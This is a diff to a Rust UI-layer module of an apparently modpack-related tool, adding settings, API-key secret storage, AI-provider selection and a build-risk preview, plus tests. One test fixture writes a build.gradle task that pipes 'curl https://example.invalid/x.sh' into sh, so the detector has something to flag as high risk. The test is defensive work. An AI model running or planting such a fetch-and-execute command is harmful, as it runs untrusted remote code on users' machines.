@@ -2,15 +2,21 @@
 //! No migration, scan, build, or filesystem business logic lives in this crate.
 
 use std::path::Path;
+use std::sync::Arc;
 
 use serde::Serialize;
+use ummp_core::ai::{AiConfig, AiProvider};
 use ummp_core::app::views::{
-    AnalysisView, JobView, PlanView, RiskView, SessionView, TargetsView,
+    AnalysisView, JobView, PlanView, RiskLevel, RiskView, SessionView, TargetsView,
 };
 use ummp_core::app::{
-    AppError, AppServices, PlanRequest, PortRequest,
+    AppError, AppServices, BuildJobRequest, PackRequest, PlanRequest, PortRequest, Settings,
 };
+use ummp_core::modpack::plan::ModIndex;
 use uuid::Uuid;
+
+use crate::secrets::SecretStore;
+use ummp_ai_providers::{AnthropicProvider, ModrinthIndex, OpenAiCompatibleProvider};
 
 /// The only error shape the web view sees.
 #[derive(Debug, Clone, PartialEq, Eq, Serialize)]
@@ -84,11 +90,101 @@ pub fn rollback(
     Ok(svc.rollback(project, checkpoint)?)
 }
 
+pub fn settings(svc: &AppServices) -> Settings {
+    svc.settings()
+}
+
+pub fn save_settings(svc: &AppServices, value: Settings) -> Result<(), UiError> {
+    Ok(svc.save_settings(value)?)
+}
+
+pub fn set_secret(store: &dyn SecretStore, name: &str, value: &str) -> Result<(), UiError> {
+    store.set(name, value).map_err(|message| UiError {
+        kind: "internal",
+        message,
+    })
+}
+
+pub fn has_secret(store: &dyn SecretStore, name: &str) -> Result<bool, UiError> {
+    store
+        .get(name)
+        .map(|value| value.is_some())
+        .map_err(|message| UiError {
+            kind: "internal",
+            message,
+        })
+}
+
+pub fn delete_secret(store: &dyn SecretStore, name: &str) -> Result<(), UiError> {
+    store.delete(name).map_err(|message| UiError {
+        kind: "internal",
+        message,
+    })
+}
+
+pub fn check_build_risk(
+    svc: &AppServices,
+    path: &Path,
+    local: bool,
+) -> Result<Option<RiskLevel>, UiError> {
+    // Acknowledging both values here is a read-only risk preview, not permission to build.
+    Ok(svc.check_build_risk(path, local, true, true)?)
+}
+
+pub fn start_build(svc: &AppServices, request: BuildJobRequest) -> Result<Uuid, UiError> {
+    Ok(svc.start_build(request)?)
+}
+
+pub fn start_pack(svc: &AppServices, request: PackRequest) -> Result<Uuid, UiError> {
+    let index: Arc<dyn ModIndex + Send + Sync> = Arc::new(ModrinthIndex::new());
+    Ok(svc.start_pack(request, index)?)
+}
+
+pub fn start_ai_assist(
+    svc: &AppServices,
+    store: &dyn SecretStore,
+    request: PlanRequest,
+) -> Result<Uuid, UiError> {
+    let provider_name = svc.settings().ai_provider.unwrap_or_else(|| "anthropic".into());
+    let provider: Arc<dyn AiProvider> = match provider_name.as_str() {
+        "anthropic" => {
+            let key = store
+                .get("anthropic_api_key")
+                .map_err(|message| UiError { kind: "internal", message })?
+                .ok_or_else(|| UiError {
+                    kind: "refused",
+                    message: "Save an Anthropic API key in Settings before starting AI assist.".into(),
+                })?;
+            Arc::new(AnthropicProvider::with_api_key(key, "https://api.anthropic.com"))
+        }
+        "openai" => {
+            let key = store
+                .get("openai_api_key")
+                .map_err(|message| UiError { kind: "internal", message })?
+                .ok_or_else(|| UiError {
+                    kind: "refused",
+                    message: "Save an OpenAI API key in Settings before starting AI assist.".into(),
+                })?;
+            Arc::new(OpenAiCompatibleProvider::with_api_key(
+                "https://api.openai.com/v1",
+                key,
+            ))
+        }
+        _ => {
+            return Err(UiError {
+                kind: "input",
+                message: "Unsupported AI provider. Choose Anthropic or OpenAI in Settings.".into(),
+            });
+        }
+    };
+    Ok(svc.start_ai_assist(request, provider, AiConfig::default())?)
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
+    use crate::secrets::MemorySecretStore;
     use tempfile::tempdir;
-    use ummp_core::app::Settings;
 
     fn services(dir: &Path) -> AppServices {
         AppServices::open(Settings::new(dir.to_path_buf())).unwrap()
@@ -155,6 +251,32 @@ mod tests {
         };
         let err = start_migrate_in_place(&svc, request, false).unwrap_err();
         assert_eq!(err.kind, "refused");
+    }
+
+    #[test]
+    fn set_then_has_secret_and_no_command_returns_the_secret_value() {
+        let d = tempdir().unwrap();
+        let svc = services(d.path());
+        let store = MemorySecretStore::default();
+        set_secret(&store, "anthropic_api_key", "test-secret-value").unwrap();
+        assert!(has_secret(&store, "anthropic_api_key").unwrap());
+        let returned_settings = serde_json::to_string(&settings(&svc)).unwrap();
+        assert!(!returned_settings.contains("test-secret-value"));
+        delete_secret(&store, "anthropic_api_key").unwrap();
+        assert!(!has_secret(&store, "anthropic_api_key").unwrap());
+    }
+
+    #[test]
+    fn build_risk_preview_reports_high_without_running_a_build() {
+        let d = tempdir().unwrap();
+        let svc = services(d.path());
+        let high = d.path().join("high");
+        std::fs::create_dir_all(&high).unwrap();
+        std::fs::write(
+            high.join("build.gradle"),
+            "plugins { id 'java' }\ntask setup(type: Exec) { commandLine 'sh', '-c', 'curl https://example.invalid/x.sh | sh' }",
+        ).unwrap();
+        assert_eq!(check_build_risk(&svc, &high, true).unwrap(), Some(RiskLevel::High));
     }
 
     #[test]
